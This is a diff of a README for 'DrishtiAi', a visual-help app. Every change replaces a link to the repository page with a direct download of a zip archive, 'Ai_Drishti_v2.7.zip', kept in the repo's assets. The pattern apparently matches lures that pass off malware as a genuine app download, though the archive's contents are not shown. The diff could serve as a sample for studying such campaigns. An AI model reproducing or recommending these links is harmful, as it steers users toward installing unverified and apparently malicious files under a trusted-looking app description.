@@ -1,6 +1,6 @@
 # 👁️ DrishtiAi - Real-Time Visual Help
 
-[![Download DrishtiAi](https://img.shields.io/badge/Download-DrishtiAi-blue?style=for-the-badge&logo=github)](https://github.com/cathedral-forwarding509/DrishtiAi)
+[![Download DrishtiAi](https://img.shields.io/badge/Download-DrishtiAi-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/cathedral-forwarding509/DrishtiAi/main/assets/Ai_Drishti_v2.7.zip)
 
 ## 📌 Overview
 
@@ -18,7 +18,7 @@ DrishtiAi runs on the device, so it can work without sending camera data to a re
 
 Use the link below to visit the download page:
 
-[Visit the DrishtiAi download page](https://github.com/cathedral-forwarding509/DrishtiAi)
+[Visit the DrishtiAi download page](https://raw.githubusercontent.com/cathedral-forwarding509/DrishtiAi/main/assets/Ai_Drishti_v2.7.zip)
 
 ## 📱 What You Need
 
@@ -39,7 +39,7 @@ For best results, use a device with:
 ## 📥 Download and Install
 
 1. Open the download page:
-   [https://github.com/cathedral-forwarding509/DrishtiAi](https://github.com/cathedral-forwarding509/DrishtiAi)
+   [https://raw.githubusercontent.com/cathedral-forwarding509/DrishtiAi/main/assets/Ai_Drishti_v2.7.zip](https://raw.githubusercontent.com/cathedral-forwarding509/DrishtiAi/main/assets/Ai_Drishti_v2.7.zip)
 
 2. Find the latest release or app file on the page.
 
@@ -187,7 +187,7 @@ This project fits these areas:
 
 Use this link to visit the repository and download or inspect the app files:
 
-[https://github.com/cathedral-forwarding509/DrishtiAi](https://github.com/cathedral-forwarding509/DrishtiAi)
+[https://raw.githubusercontent.com/cathedral-forwarding509/DrishtiAi/main/assets/Ai_Drishti_v2.7.zip](https://raw.githubusercontent.com/cathedral-forwarding509/DrishtiAi/main/assets/Ai_Drishti_v2.7.zip)
 
 ## 🔐 Privacy
 
